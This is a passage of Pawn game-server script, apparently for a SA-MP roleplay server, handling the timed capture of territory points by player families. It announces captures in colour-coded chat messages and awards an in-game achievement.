   	   	    format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for %s, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
        }
	    Capturing = 0;
	    PointInfo[idx][pOwner] = 0;
	    KillTimer(PointTimer);
	    Capturer = playerid;
	    CapturerFam = idx;
	    PointTimer = SetTimerEx("FinalCapture", 600000, false, "dd", Capturer, CapturerFam);
	}
	else
	{
		Capturing = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "** You have moved from your position and failed to capture the point.");
	}
	return 1;
}

forward FinalCapture(playerid, idx);
public FinalCapture(playerid, idx)
{
	new string[256];
	new idxx = Player[playerid][pFam];
	if(FamInfo[idxx][fColor] == 2)
    {
  		format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {0000FF}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
        SendClientMessageToAll(COLOR_LIGHTRED, string);
    }
    else if(FamInfo[idxx][fColor] == 1)
   	{
	   	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {00FFFF}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
        SendClientMessageToAll(COLOR_LIGHTRED, string);
    }
	else if(FamInfo[idxx][fColor] == 3)
	{
    	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {FF0000}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
	}
	else if(FamInfo[idxx][fColor] == 4)
	{
    	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {B40404}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
	}
	else if(FamInfo[idxx][fColor] == 5)
	{
	  	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {FFFF00}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
   	}
   	else if(FamInfo[idxx][fColor] == 6)
    {
		format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {DF7401}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
    }
   	else if(FamInfo[idxx][fColor] == 7)
   	{
	   	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {088A08}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
   	}
   	else if(FamInfo[idxx][fColor] == 8)
   	{
	 	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {CC2EFA}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
  	}
  	else if(FamInfo[idxx][fColor] == 9)
  	{
 		format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {00FF00}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
        SendClientMessageToAll(COLOR_LIGHTRED, string);
  	}
	else if(FamInfo[idxx][fColor] == 10)
	{
    	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {A4A4A4}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
        SendClientMessageToAll(COLOR_LIGHTRED, string);
	}
	else if(FamInfo[idxx][fColor] == 11)
    {
   	   	format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for {000000}%s{FF6347}.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
   	}
   	else
    {
   	    format(string, sizeof(string), "%s has successfully captured the {01A9DB}%s {FF6347}for %s.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
    }
    if(!FamInfo[idxx][fPointAchievment])
    {
        FamInfo[idxx][fPointAchievment] = 1;
        format(string, sizeof(string), "FamCmd: %s completed an achievment {01A9DB}Control the streets {FF6347}and recieved 5 family cookies.", FamInfo[idxx][fName]);
     	SendClientMessageToAll(COLOR_LIGHTRED, string);
     	FamInfo[idxx][fCookies] += 5;
    }
	Capturer = -1;
 	CapturerFam = -1;
	PointInfo[idx][pTime] = 24;
	PointInfo[idx][pOwner] = Player[playerid][pFam];
	DestroyDynamicPickup(PointInfo[idx][pPickup]);
	DestroyDynamic3DTextLabel(PointInfo[idx][pText]);
	SavePoints();
	return 1;
}
0

0
                0

